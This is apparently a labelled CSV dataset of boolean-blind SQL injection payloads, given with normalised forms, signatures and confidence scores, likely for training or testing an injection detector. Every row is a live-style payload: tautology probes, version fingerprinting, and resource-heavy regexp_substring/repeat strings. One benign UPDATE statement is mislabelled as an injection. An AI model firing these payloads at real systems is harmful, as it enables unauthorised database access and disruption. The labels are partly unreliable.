id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree,payload_norm,wrapper_detected,strip_depth,payload_delex_v2,signature,tier
1432,1' ) as mqxb where 6496 = 6496 and 7533 = 7533--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2,1' ) as mqxb where 6496 = 6496 and 7533 = 7533--,False,0,__INT__' ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ --,2e889cc8,silver
20377,1' ) as ubvf where 5923 = 5923 and 8490 = 4925--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2,1' ) as ubvf where 5923 = 5923 and 8490 = 4925--,False,0,__INT__' ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ --,2e889cc8,silver
22939,1' ) as ibaw where 2130 = 2130 and 9198 = 9198--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2,1' ) as ibaw where 2130 = 2130 and 9198 = 9198--,False,0,__INT__' ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ --,2e889cc8,silver
23034,1' ) as lgex where 4068 = 4068 and 1378 = 9247--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2,1' ) as lgex where 4068 = 4068 and 1378 = 9247--,False,0,__INT__' ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ --,2e889cc8,silver
1602,"-9699"" ) ) or ( 8459 = 8459 ) *4906 and ( ( ""dufs"" = ""dufs",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 58 chars.,1,"-9699"" ) ) or ( 8459 = 8459 ) *4906 and ( ( ""dufs"" = ""dufs",False,0,-9699__STR__dufs__STR__dufs,2ef86215,silver
18240,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ""%"" = """,boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ""%"" = """,False,0,"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( __STR__ = """,2f06b71d,silver
1136,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'gsdq' = 'gsdq",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'gsdq' = 'gsdq",False,0,"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( __STR__ = '__IDENT__",2f2a5c74,silver
22527,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'ckpm' = 'ckpm",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'ckpm' = 'ckpm",False,0,"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( __STR__ = '__IDENT__",2f2a5c74,silver
1260,"1' ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1' ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",False,0,"__INT__' ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2f67ded2,silver
1051,"-5903%"" ) ) ) or 3038 = 3038",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,2,"-5903%"" ) ) ) or 3038 = 3038",False,0,"-__INT__ % "" ) ) ) or __INT__ = __INT__",2f794c91,silver
19722,"-9854%"" ) ) ) or 6455 = 3652",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,2,"-9854%"" ) ) ) or 6455 = 3652",False,0,"-__INT__ % "" ) ) ) or __INT__ = __INT__",2f794c91,silver
21034,"-4072%"" ) ) ) or 3999 = 1979",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,2,"-4072%"" ) ) ) or 3999 = 1979",False,0,"-__INT__ % "" ) ) ) or __INT__ = __INT__",2f794c91,silver
23897,1' ) ) and ( 3020 = 3020 ) *6703 and ( ( 'mgfd' = 'mgfd,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 55 chars.,1,1' ) ) and ( 3020 = 3020 ) *6703 and ( ( 'mgfd' = 'mgfd,False,0,1__STR__mgfd__STR__mgfd,2f86d62e,silver
24927,-9355' or 6872 = 6872 and 'mztk' = 'mztk,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2,-9355' or 6872 = 6872 and 'mztk' = 'mztk,False,0,-9355__STR__mztk__STR__mztk,2fd6a600,silver
21804,"1' ) ) ) and make_set ( 9514 = 8668,8668 ) and ( ( ( 'sgjj' like 'sgjj",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 70 chars.,1,"1' ) ) ) and make_set ( 9514 = 8668,8668 ) and ( ( ( 'sgjj' like 'sgjj",False,0,1__STR__sgjj__STR__sgjj,2fedec71,silver
19431,"1%"" ) and 8626 = 3626#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2,"1%"" ) and 8626 = 3626#",False,0,"__INT__ % "" ) and __INT__ = __INT__#",2ff7f2c1,silver
24846,"1%"" ) and 4595 = 4595#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2,"1%"" ) and 4595 = 4595#",False,0,"__INT__ % "" ) and __INT__ = __INT__#",2ff7f2c1,silver
18761,"1 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",False,0,"__INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null )",306adeae,silver
1742,"-1305 ) or make_set ( 2298 = 5545,5545 ) and ( 6715 = 6715",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 58 chars.,1,"-1305 ) or make_set ( 2298 = 5545,5545 ) and ( 6715 = 6715",False,0,"-__INT__ ) or __IDENT__ ( __INT__ = __INT__ , __INT__ ) and ( __INT__ = __INT__",3111ddb8,silver
24295,"-9379 ) or make_set ( 9354 = 9354,7185 ) and ( 9212 = 9212",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 58 chars.,1,"-9379 ) or make_set ( 9354 = 9354,7185 ) and ( 9212 = 9212",False,0,"-__INT__ ) or __IDENT__ ( __INT__ = __INT__ , __INT__ ) and ( __INT__ = __INT__",3111ddb8,silver
2803,"UPDATE camp SET right = 'forest', City = 'young' WHERE main = ring",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 66 chars.,2,"UPDATE camp SET right = 'forest', City = 'young' WHERE main = ring",False,0,"update __IDENT__ set right = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",3188b7a1,silver
23180,"end and ( ( ""dmgj"" = ""dmgj",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,1,"end and ( ( ""dmgj"" = ""dmgj",False,0,"end and ( ( __STR__ = ""__IDENT__",318da6cb,silver
24881,"end and ( ( ""cxoi"" = ""cxoi",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,1,"end and ( ( ""cxoi"" = ""cxoi",False,0,"end and ( ( __STR__ = ""__IDENT__",318da6cb,silver
1724,1 ) where 6725 = 6725 and 1553 = 7419,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 37 chars.,2,1 ) where 6725 = 6725 and 1553 = 7419,False,0,__INT__ ) where __INT__ = __INT__ and __INT__ = __INT__,319848b5,silver
24391,1 ) where 8616 = 8616 and 2006 = 2006,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 37 chars.,2,1 ) where 8616 = 8616 and 2006 = 2006,False,0,__INT__ ) where __INT__ = __INT__ and __INT__ = __INT__,319848b5,silver
1898,"-8472' ) where 3340 = 3340 or make_set ( 1752 = 9905,9905 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 62 chars.,2,"-8472' ) where 3340 = 3340 or make_set ( 1752 = 9905,9905 ) --",False,0,"-__INT__' ) where __INT__ = __INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",32159ce0,silver
24246,"-9370' ) where 7070 = 7070 or make_set ( 9354 = 9354,7185 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 62 chars.,2,"-9370' ) where 7070 = 7070 or make_set ( 9354 = 9354,7185 ) --",False,0,"-__INT__' ) where __INT__ = __INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",32159ce0,silver
2529,"1%"" ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1%"" ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",False,0,"__INT__ % "" ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",32801e27,silver
82,"""a"""" or 1 = 1--""",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 16 chars.,2,"""a"""" or 1 = 1--""",False,0,__STR____STR__,32c74892,silver
185,""" or """"^""",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 9 chars.,1,""" or """"^""",False,0,__STR____STR__,32c74892,silver
239,""" or """"*""",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 9 chars.,1,""" or """"*""",False,0,__STR____STR__,32c74892,silver
2050,"1"" ) and 6565 = 2647 and ( ""mrge"" like ""mrge",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 44 chars.,2,"1"" ) and 6565 = 2647 and ( ""mrge"" like ""mrge",False,0,1__STR__mrge__STR__mrge,32d0218d,silver
2109,"1' ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1' ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",False,0,"__INT__' ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",3331c084,silver
840,"1' ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 'ujjr' = 'ujjr",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1' ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 'ujjr' = 'ujjr",False,0,"__INT__ ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __IDENT__",333deb0f,silver
2443,"1' ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 'cylu' = 'cylu",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1' ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 'cylu' = 'cylu",False,0,"__INT__ ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __IDENT__",333deb0f,silver
18698,"1' ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 'jhle' like 'jhle",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1' ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 'jhle' like 'jhle",False,0,"__INT__ ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __IDENT__",333deb0f,silver
21429,"1"" ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""fpwu"" like ""fpwu",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1"" ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""fpwu"" like ""fpwu",False,0,"__INT__ ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __IDENT__",333deb0f,silver
24064,"1"" ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""vfoh"" = ""vfoh",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1"" ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""vfoh"" = ""vfoh",False,0,"__INT__ ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __IDENT__",333deb0f,silver
901,"1' where 1836 = 1836 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1' where 1836 = 1836 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",False,0,"__INT__' where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",3340570e,silver
18712,"1' where 1031 = 1031 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1' where 1031 = 1031 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",False,0,"__INT__' where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",3340570e,silver
534,-7111' or ( 8459 = 8459 ) *4906,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 31 chars.,1,-7111' or ( 8459 = 8459 ) *4906,False,0,-__INT__' or ( __INT__ = __INT__ ) * __INT__,3380a463,silver
2523,-2233' or ( 1807 = 7274 ) *7274,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 31 chars.,1,-2233' or ( 1807 = 7274 ) *7274,False,0,-__INT__' or ( __INT__ = __INT__ ) * __INT__,3380a463,silver
25963,"1 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) -- ztzu",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) -- ztzu",False,0,"__INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) -- __IDENT__",33927d03,silver
1205,"-5132%"" ) ) or 3038 = 3038",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2,"-5132%"" ) ) or 3038 = 3038",False,0,"-__INT__ % "" ) ) or __INT__ = __INT__",3393ca5f,silver
20072,"-1072%"" ) ) or 3090 = 3539",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2,"-1072%"" ) ) or 3090 = 3539",False,0,"-__INT__ % "" ) ) or __INT__ = __INT__",3393ca5f,silver
21572,"-9504%"" ) ) or 8098 = 7472",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2,"-9504%"" ) ) or 8098 = 7472",False,0,"-__INT__ % "" ) ) or __INT__ = __INT__",3393ca5f,silver
22214,"1' ) ) and make_set ( 8403 = 8403,8899 ) and ( ( 'sxgl' = 'sxgl",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 63 chars.,1,"1' ) ) and make_set ( 8403 = 8403,8899 ) and ( ( 'sxgl' = 'sxgl",False,0,1__STR__sxgl__STR__sxgl,33db739a,silver
22716,1' and ( 1088 = 7530 ) *7530 and 'xkfu' = 'xkfu,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 47 chars.,1,1' and ( 1088 = 7530 ) *7530 and 'xkfu' = 'xkfu,False,0,1__STR__xkfu__STR__xkfu,342d5fe1,silver
40511,"' AND MID(version(),1,1)='5'--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 30 chars.,1,"' AND MID(version(),1,1)='5'--",False,0,__IDENT__' --,3439002f,silver
1403,-7293' ) ) ) or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2,-7293' ) ) ) or 3038 = 3038,False,0,-__INT__' ) ) ) or __INT__ = __INT__,348712fd,silver
2725,-4713' ) ) ) or 4567 = 1287,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2,-4713' ) ) ) or 4567 = 1287,False,0,-__INT__' ) ) ) or __INT__ = __INT__,348712fd,silver
19770,-6766' ) ) ) or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2,-6766' ) ) ) or 3038 = 3038,False,0,-__INT__' ) ) ) or __INT__ = __INT__,348712fd,silver
20511,-6757' ) ) ) or 4524 = 3696,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2,-6757' ) ) ) or 4524 = 3696,False,0,-__INT__' ) ) ) or __INT__ = __INT__,348712fd,silver
20788,-2316' ) ) ) or 8519 = 6010,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2,-2316' ) ) ) or 8519 = 6010,False,0,-__INT__' ) ) ) or __INT__ = __INT__,348712fd,silver
21189,-2504' ) ) ) or 8723 = 9715,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2,-2504' ) ) ) or 8723 = 9715,False,0,-__INT__' ) ) ) or __INT__ = __INT__,348712fd,silver
21556,-8397' ) ) ) or 2171 = 4788,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2,-8397' ) ) ) or 2171 = 4788,False,0,-__INT__' ) ) ) or __INT__ = __INT__,348712fd,silver
21780,-4873' ) ) ) or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2,-4873' ) ) ) or 3038 = 3038,False,0,-__INT__' ) ) ) or __INT__ = __INT__,348712fd,silver
25713,-5327' ) ) ) or 1606 = 6099,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2,-5327' ) ) ) or 1606 = 6099,False,0,-__INT__' ) ) ) or __INT__ = __INT__,348712fd,silver
2589,1' ) and 2577 = 7094,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2,1' ) and 2577 = 7094,False,0,__INT__' ) and __INT__ = __INT__,349620a9,silver
19795,1' ) and 7533 = 7533,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2,1' ) and 7533 = 7533,False,0,__INT__' ) and __INT__ = __INT__,349620a9,silver
22923,1' ) and 2305 = 1934,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2,1' ) and 2305 = 1934,False,0,__INT__' ) and __INT__ = __INT__,349620a9,silver
23150,1' ) and 2006 = 2006,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2,1' ) and 2006 = 2006,False,0,__INT__' ) and __INT__ = __INT__,349620a9,silver
24728,1' ) and 5999 = 5879,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2,1' ) and 5999 = 5879,False,0,__INT__' ) and __INT__ = __INT__,349620a9,silver
20235,1' and ( 3423 = 7789 ) *7789 and 'pdia' like 'pdia,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,1,1' and ( 3423 = 7789 ) *7789 and 'pdia' like 'pdia,False,0,1__STR__pdia__STR__pdia,34c30743,silver
1048,1%' ) ) ) and 1661 = 7683,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2,1%' ) ) ) and 1661 = 7683,False,0,__INT__ % ' ) ) ) and __INT__ = __INT__,34ecd88e,silver
1444,1%' ) ) ) and 2006 = 2006,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2,1%' ) ) ) and 2006 = 2006,False,0,__INT__ % ' ) ) ) and __INT__ = __INT__,34ecd88e,silver
25997,"end and ""%"" = """,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 15 chars.,1,"end and ""%"" = """,False,0,"end and __STR__ = """,352a7afa,silver
240,"hi or 1 = 1 --""",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 15 chars.,2,"hi or 1 = 1 --""",False,0,"__IDENT__ or __INT__ = __INT__ -- """,35bc24fe,silver
410,1' ) and ( 7603 = 3634 ) *3634,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 30 chars.,1,1' ) and ( 7603 = 3634 ) *3634,False,0,__INT__' ) and ( __INT__ = __INT__ ) * __INT__,3612fa00,silver
23770,1' ) and ( 3020 = 3020 ) *6703,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 30 chars.,1,1' ) and ( 3020 = 3020 ) *6703,False,0,__INT__' ) and ( __INT__ = __INT__ ) * __INT__,3612fa00,silver
659,-5026' or ( 8459 = 8459 ) *4906 and 'uavj' like 'uavj,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 53 chars.,1,-5026' or ( 8459 = 8459 ) *4906 and 'uavj' like 'uavj,False,0,-5026__STR__uavj__STR__uavj,36757818,silver
23042,end and '%' = ',boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 15 chars.,1,end and '%' = ',False,0,end and __STR__ = ',36ad4290,silver
